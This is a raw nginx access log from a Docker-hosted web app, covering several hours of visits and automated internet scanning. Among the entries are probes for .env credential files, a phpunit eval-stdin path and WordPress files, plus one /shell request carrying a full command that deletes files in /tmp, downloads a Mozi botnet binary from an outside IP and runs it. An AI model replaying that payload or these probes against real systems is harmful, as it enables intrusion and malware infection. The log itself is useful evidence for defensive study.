/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf
/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
/docker-entrypoint.sh: Configuration complete; ready for start up
162.158.95.79 - - [09/Feb/2025:21:50:11 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
31.13.224.222 - - [10/Feb/2025:00:31:04 +0000] "GET /.env HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.99 Safari/537.36" "-"
95.214.55.132 - - [10/Feb/2025:00:31:05 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
64.23.201.216 - - [10/Feb/2025:00:34:44 +0000] "GET /libs/js/iframe.js HTTP/1.0" 404 153 "-" "xfa1" "-"
113.62.169.130 - - [10/Feb/2025:00:42:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
113.62.169.130 - - [10/Feb/2025:00:42:06 +0000] "GET / HTTP/1.1" 200 671 "http://www.revuagencyapp.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
191.106.197.251 - - [10/Feb/2025:00:55:54 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 301 169 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3"
191.106.197.251 - - [10/Feb/2025:00:55:54 +0000] "GET /apple-touch-icon.png HTTP/1.1" 301 169 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3"
191.106.197.251 - - [10/Feb/2025:00:55:54 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
191.106.197.251 - - [10/Feb/2025:00:55:54 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 200 671 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3" "-"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0" "-"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3" "-"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3" "-"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 671 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3" "-"
191.106.197.251 - - [10/Feb/2025:00:55:55 +0000] "GET /logo192.png HTTP/1.1" 200 671 "-" "com.apple.WebKit.Networking/20620.2.4.11.5 Network/4277.81.1 macOS/15.3" "-"
34.78.69.184 - - [10/Feb/2025:01:08:38 +0000] "GET / HTTP/1.1" 200 671 "-" "python-requests/2.32.3" "-"
194.50.16.218 - - [10/Feb/2025:01:11:16 +0000] "GET / HTTP/1.1" 200 671 "-" "libwww-perl/6.77" "-"
47.88.78.6 - - [10/Feb/2025:01:13:43 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
47.88.86.63 - - [10/Feb/2025:01:13:44 +0000] "GET /Public/home/js/check.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
47.251.11.3 - - [10/Feb/2025:01:13:44 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
51.8.231.231 - - [10/Feb/2025:01:56:45 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 200 671 "-" "Mozilla/5.0 zgrab/0.x" "-"
185.242.226.154 - - [10/Feb/2025:01:59:06 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
80.82.77.202 - - [10/Feb/2025:02:09:07 +0000] "GET / HTTP/1.0" 200 671 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" "-"
185.100.87.136 - - [10/Feb/2025:02:09:15 +0000] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 157 "-" "-" "-"
185.100.87.136 - - [10/Feb/2025:02:09:15 +0000] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 157 "-" "-" "-"
170.106.73.216 - - [10/Feb/2025:02:09:56 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.73.216 - - [10/Feb/2025:02:09:58 +0000] "GET / HTTP/1.1" 200 671 "http://www.revuagencyapp.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
175.30.110.199 - - [10/Feb/2025:02:21:11 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://175.30.110.199:44795/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 153 "-" "Hello, world" "-"
193.68.89.10 - - [10/Feb/2025:02:24:00 +0000] "HEAD / HTTP/1.1" 200 0 "-" "curl/7.68.0" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "" 400 0 "-" "-" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //xmlrpc.php?rsd HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:49 +0000] "GET //2018/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //media/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.154.77.198 - - [10/Feb/2025:02:50:50 +0000] "" 400 0 "-" "-" "-"
185.196.220.253 - - [10/Feb/2025:03:02:57 +0000] "GET / HTTP/1.1" 200 671 "-" "Hello World" "-"
45.79.115.59 - - [10/Feb/2025:03:04:32 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 zgrab/0.x" "-"
172.104.11.34 - - [10/Feb/2025:03:04:41 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
172.206.142.136 - - [10/Feb/2025:03:19:17 +0000] "GET /actuator/health HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
20.118.68.201 - - [10/Feb/2025:03:20:55 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 zgrab/0.x" "-"
167.94.146.61 - - [10/Feb/2025:03:22:30 +0000] "GET / HTTP/1.1" 200 671 "-" "-" "-"
167.94.146.61 - - [10/Feb/2025:03:22:35 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.61 - - [10/Feb/2025:03:22:35 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.61 - - [10/Feb/2025:03:22:36 +0000] "GET /logo192.png HTTP/1.1" 200 671 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
43.153.19.83 - - [10/Feb/2025:03:38:08 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
89.248.172.41 - - [10/Feb/2025:03:42:57 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.105 Version/17.0 Mobile/15E148 Safari/604.1" "-"
192.155.90.220 - - [10/Feb/2025:03:46:38 +0000] "\x16\x03\x01\x01" 400 157 "-" "-" "-"
192.155.90.220 - - [10/Feb/2025:03:46:39 +0000] "\x16\x03\x01\x01" 400 157 "-" "-" "-"
185.242.226.159 - - [10/Feb/2025:03:48:17 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
167.94.138.190 - - [10/Feb/2025:03:56:50 +0000] "GET / HTTP/1.1" 400 255 "-" "-" "-"
167.94.138.190 - - [10/Feb/2025:03:57:02 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.190 - - [10/Feb/2025:03:57:05 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.190 - - [10/Feb/2025:03:57:09 +0000] "GET /logo192.png HTTP/1.1" 200 671 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
78.153.140.148 - - [10/Feb/2025:04:20:25 +0000] "GET /.env.save HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:04:20:25 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:04:20:25 +0000] "GET /.env.save HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:04:20:26 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
13.88.9.38 - - [10/Feb/2025:04:21:19 +0000] "MGLNDD_165.22.179.233_443" 400 157 "-" "-" "-"
204.188.228.42 - - [10/Feb/2025:04:27:55 +0000] "GET /.env HTTP/1.1" 200 671 "-" "Mozilla/5.0 Keydrop" "-"
204.188.228.42 - - [10/Feb/2025:04:27:55 +0000] "GET /.env HTTP/1.1" 400 255 "-" "Mozilla/5.0 Keydrop" "-"
205.210.31.194 - - [10/Feb/2025:05:01:31 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xB4\x81\xB4\x8A\x0Ez" 400 157 "-" "-" "-"
205.210.31.194 - - [10/Feb/2025:05:01:31 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1D\xEF+\x92\xEE\x19\x99k\xBB\xB2#[@f\xB5\xF7I\xB5\x1F8\xBA\xDCM\x17\xD5\xF9\xACI\x87'\xD5\xDA P\x84\x88;\x88\xEE\xDB=\xA67\x1D\x17\xC8>~\x89\x0BW\xB2v\x7F\x96\x1D\x08AQ\x10,&O\x947\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
173.244.56.27 - - [10/Feb/2025:05:01:31 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
185.242.226.159 - - [10/Feb/2025:05:17:41 +0000] "GET /logo192.png HTTP/1.1" 200 671 "-" "python-requests/2.26.0" "-"
185.242.226.159 - - [10/Feb/2025:05:17:41 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "python-requests/2.26.0" "-"
185.242.226.159 - - [10/Feb/2025:05:17:41 +0000] "GET / HTTP/1.1" 200 671 "-" "python-requests/2.26.0" "-"
185.242.226.159 - - [10/Feb/2025:05:19:21 +0000] "GET /logo192.png HTTP/1.1" 200 671 "-" "python-requests/2.26.0" "-"
185.242.226.159 - - [10/Feb/2025:05:19:21 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "python-requests/2.26.0" "-"
185.242.226.159 - - [10/Feb/2025:05:19:22 +0000] "GET / HTTP/1.1" 200 671 "-" "python-requests/2.26.0" "-"
117.26.242.199 - - [10/Feb/2025:05:19:23 +0000] "GET / HTTP/1.1" 301 169 "-" "python-requests/2.32.3"
117.26.242.199 - - [10/Feb/2025:05:19:25 +0000] "GET / HTTP/1.1" 200 671 "-" "python-requests/2.32.3" "-"
78.153.140.148 - - [10/Feb/2025:05:22:36 +0000] "GET /.env.save HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:05:22:37 +0000] "GET /.env.save HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:05:22:37 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.148 - - [10/Feb/2025:05:22:37 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
71.6.232.23 - - [10/Feb/2025:05:23:21 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" "-"
117.62.235.53 - - [10/Feb/2025:05:32:28 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
136.144.43.52 - - [10/Feb/2025:05:36:26 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
136.144.43.58 - - [10/Feb/2025:05:36:26 +0000] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
136.144.43.43 - - [10/Feb/2025:05:36:31 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:50 +0000] "GET / HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:51 +0000] "GET /static/css/main.6bf7cf14.css HTTP/1.1" 200 624076 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:54 +0000] "GET /static/js/main.1d80f062.js HTTP/1.1" 200 2983207 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:55 +0000] "GET /locales/en-US/translation.json HTTP/1.1" 200 671 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:55 +0000] "GET /locales/en/translation.json HTTP/1.1" 200 94 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /static/js/19.fc5c49a0.chunk.js HTTP/1.1" 200 525159 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /locales/en-US/menu.json HTTP/1.1" 200 671 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /locales/en/menu.json HTTP/1.1" 200 4008 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /static/js/588.8f241505.chunk.js HTTP/1.1" 200 4356 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /manifest.json HTTP/1.1" 200 413 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:56 +0000] "GET /logo192.png HTTP/1.1" 200 671 "https://revuagencyapp.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
191.106.219.134 - - [10/Feb/2025:05:40:57 +0000] "GET /static/media/logo_login.5ae37f3d0eb20651dff4.png HTTP/1.1" 200 13089 "https://revuagencyapp.com/auth-pages/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" "-"
